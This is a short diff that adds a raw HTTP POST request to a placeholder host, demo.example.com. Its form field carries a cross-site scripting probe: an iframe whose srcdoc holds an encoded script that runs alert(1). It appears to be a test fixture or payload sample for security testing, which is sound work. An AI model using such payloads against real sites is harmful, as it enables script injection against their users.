@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+Connection: close
+
+q=<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
